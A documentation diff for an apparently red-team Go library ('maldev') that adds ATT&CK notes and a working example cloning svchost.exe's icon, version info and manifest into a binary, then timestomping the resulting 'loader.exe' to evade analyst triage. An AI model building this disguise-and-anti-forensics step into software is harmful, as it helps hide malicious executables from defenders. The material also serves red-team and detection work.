@@ -2,6 +2,19 @@
 
 [<- Back to PE Operations](README.md)
 
+**MITRE ATT&CK:** [T1036.005 - Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)
+**Package:** `pe/masquerade`
+**Platform:** Windows (binary runs on Windows; generator is cross-platform)
+**Detection:** Low (metadata spoof — defeats casual inspection, visible to signature validation)
+
+---
+
+## For Beginners
+
+Task Manager and Process Explorer trust the icon, company name, and description inside a PE's resource section. Masquerade copies those resources from a trusted binary (`svchost.exe`, `cmd.exe`, `notepad.exe`) into yours at build time, so the analyst's first-pass "what is this?" answers with `Microsoft Corporation`. The underlying code, imports, and unsigned status still give it away to anyone who looks past the icon.
+
+---
+
 ## What It Does
 
 Embeds the manifest, icons and VERSIONINFO of a legitimate Windows executable
@@ -111,6 +124,75 @@ Regenerate when:
 - You want to add a new identity (extend the `identities` slice in
   `pe/masquerade/internal/gen/main.go`).
 - You want to add a new variant (e.g. `highestAvailable` UAC level).
+
+---
+
+## Combined Example
+
+Generate a `.syso` that clones `svchost.exe`'s resources, build the
+binary, then timestomp the resulting EXE to match svchost's creation
+and modification times — defenders see an unsigned "svchost" with
+plausible file timestamps in a non-standard path, which is suspicious
+but no longer trivially distinguishable from a legitimate side-loaded
+service host.
+
+```go
+// generator.go — run via `go generate` before `go build`.
+//go:build ignore
+
+package main
+
+import (
+    "log"
+
+    "github.com/oioio-space/maldev/pe/masquerade"
+)
+
+func main() {
+    // 1. Extract svchost's manifest, icons, and VERSIONINFO into a
+    //    .syso that the Go linker will pick up automatically.
+    err := masquerade.Clone(
+        `C:\Windows\System32\svchost.exe`,
+        "resource_windows_amd64.syso",
+        masquerade.AMD64,
+        masquerade.AsInvoker,
+    )
+    if err != nil {
+        log.Fatal(err)
+    }
+}
+```
+
+```go
+// stamp.go — runs on the build host after `go build` produces the EXE.
+package main
+
+import (
+    "os"
+
+    "github.com/oioio-space/maldev/cleanup/timestomp"
+)
+
+func main() {
+    si, err := os.Stat(`C:\Windows\System32\svchost.exe`)
+    if err != nil {
+        panic(err)
+    }
+    t := si.ModTime()
+    // Match creation + access + modification times on the loader.
+    _ = timestomp.SetFull(`.\loader.exe`, t, t, t)
+}
+```
+
+Layered benefit: `pe/masquerade` handles visible identity (icon +
+VERSIONINFO + manifest) so Task Manager and Process Explorer render a
+Microsoft-branded entry, and `cleanup/timestomp` handles the MFT
+evidence so `dir /tq` and timeline-reconstruction tools see the
+binary blending in with its claimed origin. Neither alone fools a
+signature check, but together they survive triage long enough to
+matter.
+
+---
 
 ## MITRE ATT&CK
 
@@ -324,3 +406,9 @@ appended to the final PE after linking, using `cert.Write`.
 
 - [tc-hib/winres](https://github.com/tc-hib/winres) — pure-Go COFF `.rsrc`
   emitter used by the generator.
+
+---
+
+## API Reference
+
+See [pe.md](../../pe.md#pemasquerade----pe-resource-masquerading)
